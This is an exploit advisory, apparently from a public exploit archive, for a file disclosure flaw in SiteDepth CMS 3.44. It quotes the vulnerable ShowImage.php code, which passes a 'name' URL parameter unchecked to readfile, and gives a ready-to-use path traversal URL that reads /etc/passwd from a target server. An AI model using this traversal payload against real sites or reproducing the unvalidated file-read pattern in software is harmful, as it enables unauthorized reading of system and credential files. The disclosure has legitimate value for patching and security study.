SiteDepth CMS 3.44 (ShowImage.php name) File Disclosure Vulnerability
=====================================================================




__________________________________________________________________________

[*] Sitedepth CMS 3.44 Local File Include LFI Exploit       
__________________________________________________________________________

[!] Application homepage :   http://www.sitedepth.com/
[!] Author               :   H4 / Team XPK 
[!] Bug discovered       :   2006-11-07
[!] Bug published        :   2007-06-25

---------------------------------------------------------------------

Vuln. code: ShowImage.php


<?php

  include &#039;sitedepth.php&#039;;
  $content_type = &#039;image/jpeg&#039;;
  $filename = SD_DIRS_REPOS . &#039;/html/&#039; . $_GET[&#039;name&#039;];
  $filename_show = $_GET[&#039;name&#039;];
  header (&#039;Content-type: &#039; . $content_type);
  header (&#039;Content-Disposition: inline;    filename=&#039; . $filename_show);
  readfile ($filename);   <-------------- BAD!   
?>

---------------------------------------------------------------------

[!] Exploitation : http://noobie.com/sitedepth/ShowImage.php?name=../../../../../../../../etc/passwd

---------------------------------------------------------------------

[!] Sometimes it`s time to give instead of taking :)

[!] Greetz to Angeldust & Streets and to rest of community.



